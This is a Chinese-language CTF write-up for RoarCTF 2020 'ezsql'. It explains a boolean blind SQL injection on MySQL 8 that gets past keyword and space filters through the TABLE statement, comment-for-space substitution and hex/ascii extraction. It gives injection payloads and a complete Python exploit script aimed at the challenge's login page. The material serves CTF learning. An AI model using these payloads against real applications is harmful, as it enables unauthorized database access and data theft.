## 2020-RoarCTF-ezsql

### 题目考点

```
1. mysql8 特性
2. Sql 布尔盲注
```

### 题目writeup

简单测试，发现存在两种回显，用户名为admin时，返回 password error，而用户名随便填写，返回username error。猜测可能存在布尔盲注，`gml'or 1#`发现空格被过滤。`gml'or/**/1#`返回 password error，找到了注入点。

进一步尝试注入，发现过滤了 select、insert、union、execute、prepare、where 等，并且无法绕过，所以无法查询出数据。但是可以通过 `database()`注出数据库名是 `ctf`，通过`version()`发现版本是 8.0.22。

联想到 mysql 8.0.19 更新的新特性 `table`命令，但是 table 命令无法按列查询，也不支持 where（where也被过滤）只能查询出整个表数据。尝试注出 `information_schema.tables`的数据翻下文档发现这个表有21列，并且第一列是`def`固定，第二列是数据库名字。`table`支持limit，但是没有 where，我们可以通过`order by CREATE_TIME dsec`把用户自己建的表查到最前面。然后通过盲注就可以注出`ctf`第一个表是 `admin`，第二个表是`f11114g`。payload：（空格替换一下）

```
gml' or (("def","ctf","f","",1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)<(table information_schema.tables order by CREATE_TIME DESC limit 1,1))#
```

这里需要注意 mysql 直接比较，可能会有不区分大小写的问题。表名只有两个字母，所以最多试4次即可。

因为 table 命令不需字段名，所以我们尝试直接获取 f11114g 表的内容。测试一下发现

```
gml'or ((' ')<(table f11114g limit 0,1))#
```

返回password error。而

```
gml'or ((' ',' ')<(table f11114g limit 0,1))#
```

返回 username error。可以初步判断这个表只有一列。（也可以用 order by）

尝试利用注表名的方式注入，发现字符串比较涉及特殊字符，bug 很多。因为 f11114g 表只有一列，可以用 hex + ascii 进行编码从而注入：

```
gml'or (ascii(substr(hex((table f11114g limit 0,1)),1,1)))=65
```

注入出第一行数据是`This_is_not_Flag`，继续注第二行数据，可以得到 flag。

exp：

```python
import requests
import string

session = requests.Session()

url = "http://oj.moxiaoxi.info:28001/login.php"
# url = "http://localhost:3334/login.php"

def req(username, password):
    paramsPost = {"password": password, "username": username}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    # response = session.post(url, data=paramsPost, headers=headers, proxies={'http': 'http://127.0.0.1:8080'})
    response = session.post(url, data=paramsPost, headers=headers)

    return response.content


def get_version():
    sql = "(ascii(substr(version(),{i},1)))={val}"
    tem = "gml' or (%s)#"
    data = ""
    for i in range(1, 50):
        for c in map(ord, string.printable):
            exp = tem % (sql.format(i=i, val=c))
            exp = exp.replace(" ", "/**/")
            content = req(exp, 'gml')
            if "password error!" in content:
                data += chr(c)
                print data
                break


def get_table():
    # table_name: f11114g
    dict = map(ord, string.printable)
    dict.sort()
    dict = map(chr, dict)
    dict.remove('"')
    dict.remove('\\')
    dict.remove(' ')
    data = ""
    sql = '''gml' or (("def","ctf","%s","",1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)<(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#'''
    for i in range(50):
        for c in dict:
            exp = sql % (data + c)
            exp = exp.replace(" ", "/**/")
            content = req(exp, 'gml')
            if "username error!" in content:
                data += dict[dict.index(c)-1]
                print data
                break

def get_flag():
    sql = "(ascii(substr(hex((table f11114g limit 1,1)),{i},1)))={val}"
    tem = "gml' or (%s)#"
    data = ""
    for i in range(1,85):
        for c in map(ord, string.printable):
            exp = tem % (sql.format(i=i, val=c))
            exp = exp.replace(" ", "/**/")
            content = req(exp, 'gml')
            if "password error!" in content:
                data += chr(c)
                print data
                break
    print data.decode("hex")

def test():
    # exp = '''gml' or (("def","ctf","ab"," ",1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)<(table information_schema.tables order by CREATE_TIME DESC limit 4,1))#'''
    exp = '''gml';create database test#'''
    exp = exp.replace(" ", "/**/")
    print req(exp, 'gml')


if __name__ == "__main__":
    # test()
    get_flag()
    # get_table()
    # get_version()

```





